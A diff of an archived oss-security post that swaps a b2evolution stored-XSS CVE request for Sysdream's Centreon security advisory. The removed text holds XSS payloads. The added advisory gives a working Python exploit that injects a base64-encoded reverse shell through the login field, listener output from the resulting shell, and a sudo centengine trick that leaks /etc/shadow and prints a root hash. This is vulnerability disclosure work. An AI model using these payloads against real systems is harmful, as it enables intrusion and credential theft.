@@ -1,47 +1,206 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/12/1
-Message-ID: <6D072F0A5597B449BEE8A9770E0BDBEA018D3CBA@EX01.corp.qihoo.net>
-Date: Mon, 12 Sep 2016 02:19:33 +0000
-From: 陈瑞琦 <chenruiqi@....cn>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: CVE Request: XSS vulns in b2evolution v6.7.5
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/25/2
+Message-ID: <56CED2A7.3090400@sysdream.com>
+Date: Thu, 25 Feb 2016 11:08:39 +0100
+From: Sysdream Labs <labs@...dream.com>
+To: oss-security@...ts.openwall.com
+Cc: fulldisclosure@...lists.org
+Subject: CVE ID Request : Centreon remote code execution
 Content-Type: text/plain; charset=utf-8
 
-I have found 2 XSS vulns in b2evolution v 6.7.5
-
-Title: Stored XSS in b2evolution version 6.7.5 amd before
-Author: Chen Ruiqi, Chenruiqi@....cn, @Codesafe Team
-Download Site: http://b2evolution.net/downloads/
-Vendor: b2evolution.net
-Vendor Notified: 2016-08-12
-Vendor Contact: http://b2evolution.net/?disp=msgform
---------------------------------------------------------------------------------------------------------
-Discription:
-b2evolution is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
-b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a "one click install" web app.[3](Wiki)
------------------------------------------------------------------------------------------------------------
-Vulnerability:
-There is stored XSS in b2evolution version 6.7.5
-Any user can post a forum with some evil code in it.
-Post a forum with some thing like
-[test_forum_xss](http://test.forum.xss"onmouseover="alert(1)"on="1 "test_forum_xss")
-----------------------------------------------------------------------------------------------------------
-Fix code:
-https://github.com/b2evolution/b2evolution/commit/9a4ab85439d1b838ee7b8eeebbf59174bb787811
------------------------------------------------------------------------------------------------------------------
-Vulnerability:
-There is stored XSS in b2evolution version 6.7.5
-An authentic user can inject javascript code in the website header.
-Edit the "Short site name" at set_settings with something like
-test_short_name_xss" onmouseover=alert(1) on
-------------------------------------------------------------------------------------------------------------------------
-Fix code:
-https://github.com/b2evolution/b2evolution/commit/dd975fff7fce81bf12f9c59edb1a99475747c83c
+Unauthenticated Remote Command Execution in Centreon Web Interface
+==================================================================
 
 
-Could you assign CVE id for those?
+Description
+===========
 
-Thank you
+Centreon is a popular monitoring solution.
 
-Chen Ruiqi
-Codesafe Team
+A critical vulnerability has been found in the Centreon logging class
+allowing remote users to execute arbitrary commands.
+
+
+SQL injection leading to RCE
+============================
+
+Centreon logs SQL database errors in a log file using the "echo" system
+command and the exec() PHP function. On the authentification class,
+Centreon use htmlentities with the ENT_QUOTES options to filter SQL
+entities.
+However, Centreon doesn't filter the SQL escape character "\" and it is
+possible to generate an SQL Error.
+Because of the use of the "echo" system command with the PHP exec()
+function, and because of the lack of sanitization, it is possible to
+inject arbitrary system commands.
+
+**Access Vector**: remote
+
+**Security Risk**: high
+
+**Vulnerability**: CWE-78
+
+----------------
+Proof of Concept
+----------------
+
+TCP Reverse Shell using python.
+
+    #!/usr/bin/env python
+    import requests
+    import argparse
+
+    def shell(target, reverseip, reverseport):
+        payload = 'import socket as a,subprocess as b,os as
+c;s=a.socket(2,1);s.connect(("%s",%d));d=s.fileno();c.dup2(d,0);c.dup2(d,1);c.dup2(d,2);p=b.call(["sh"]);'
+% (reverseip,reverseport)
+        print "[~] Starting reverseshell : %s - port : %d" % (reverseip,
+reverseport)
+        req = requests.post(target, data={"useralias": "$(echo %s |
+base64 -d | python)\\" % payload.encode("base64").replace("\n",""),
+"password": "foo"})
+        print "[+] DEAD !"
+
+    if __name__ == "__main__":
+        print "[~] Centreon Unauthentificated RCE - Nicolas Chatelain
+<n.chatelain@...dream.com>"
+        parser = argparse.ArgumentParser()
+        parser.add_argument("--target", required=True)
+        parser.add_argument("--reverseip", required=True)
+        parser.add_argument("--reverseport", required=True, type=int)
+        args = parser.parse_args()
+        shell(args.target, args.reverseip, args.reverseport)
+
+Shell :
+
+    nightlydev@...rkstation ~/Lab/Centreon $ python reverseshell.py
+--target=http://172.16.138.137/centreon/index.php
+--reverseip=172.16.138.1 --reverseport 8888
+    [~] Centreon Unauthentificated RCE - Nicolas Chatelain
+<n.chatelain@...dream.com>
+    [~] Starting reverseshell : 172.16.138.1 - port : 8888
+
+# Other term
+
+nightlydev@...rkstation ~/Lab/Centreon $ nc -lvp 8888
+Ncat: Version 6.45 ( http://nmap.org/ncat )
+Ncat: Listening on :::8888
+Ncat: Listening on 0.0.0.0:8888
+Ncat: Connection from 172.16.138.135.
+Ncat: Connection from 172.16.138.135:50050.
+whoami
+apache
+groups
+apache centreon-engine centreon-broker centreon nagios
+
+
+---------------
+Vulnerable code
+---------------
+
+The vulnerable code is located in class/centreonLog.class.php, line 82
+and line 154:
+
+
+		/*
+		 * print Error in log file.
+		 */
+		exec("echo \"".$string."\" >> ".$this->errorType[$id]);
+
+In class/centreonAuth.class.php, line 227:
+
+	 $DBRESULT = $this->pearDB->query("SELECT * FROM `contact` WHERE
+`contact_alias` = '" . htmlentities($username, ENT_QUOTES, "UTF-8") . "'
+AND `contact_activate` = '1' AND 		 `contact_register` = '1' LIMIT 1");
+
+
+--------
+Solution
+--------
+
+Update to the Centreon 2.5.4
+
+
+Possible root password disclosure in centengine (Centreon Entreprise Server)
+============================================================================
+
+In some configurations, when centengine can run as root (with sudo).
+It's possible to read some file content.
+
+**Access Vector**: local
+
+**Security Risk**: high
+
+**Vulnerability**: CWE-209
+
+----------------
+Proof of Concept
+----------------
+
+    $ sudo /usr/sbin/centengine -v /etc/shadow
+    [1416391088] reading main config file
+    [1416391088] error while processing a config file: [/etc/shadow:1]
+bad variable name:
+'root:$6$3mvvEHQM3p3afuh4$DZ377daOy.8bn42t7ur82/Geplvsj90J7cs1xsgAbRZ0JDZ8KdB5CcQ0ucF5dwKpnBYLon1XBqjJPqpm6Zr5R0:16392:0:99999:7:::'
+    [1416391088]
+
+---------------
+Vulnerable code
+---------------
+
+In Centreon Entreprise Server (CES) : /etc/sudoers.d/centreon
+
+CENTREON   ALL = NOPASSWD: /usr/sbin/centengine -v *
+
+--------
+Solution
+--------
+
+Do not allow centengine to be run as root or do not disclose the line
+that caused the error.
+
+Timeline (dd/mm/yyyy)
+=====================
+
+* 18/11/2014 : Initial discovery
+* 26/11/2014 : Contact with Centreon team
+* 27/11/2014 : Centreon correct vulnerabilities
+* 27/11/2014 : Centreon release version 2.5.4 that fixes vulnerabilities
+
+Fixes
+=====
+
+*
+https://github.com/centreon/centreon/commit/a6dd914418dd185a698050349e05f10438fde2a9
+*
+https://github.com/centreon/centreon/commit/d00f3e015d6cf64e45822629b00068116e90ae4d
+*
+https://github.com/centreon/centreon/commit/015e875482d7ff6016edcca27bffe765c2bd77c1
+
+Affected versions
+=================
+
+* Centreon <= 2.5.3
+
+
+Credits
+=======
+
+* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)
+
+
+Best regards,
+-- 
+SYSDREAM Labs <labs@...dream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
